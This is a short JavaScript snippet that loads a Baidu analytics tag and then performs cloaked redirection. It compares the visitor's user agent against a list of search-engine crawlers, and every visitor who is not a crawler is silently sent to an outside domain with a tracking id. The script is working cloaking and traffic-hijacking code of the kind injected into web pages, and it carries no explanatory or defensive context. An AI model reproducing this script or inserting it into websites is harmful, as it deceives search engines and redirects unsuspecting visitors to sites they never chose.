var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?80a4209849e7f9537af466fdf0af08e4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var userAgent = navigator.userAgent;
var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];

var isSpider = spiderList.some(function(spider) {
    return userAgent.includes(spider);
});

if (!isSpider) {
    window.location.href = "https://www.262j.com?id=395312789";
}
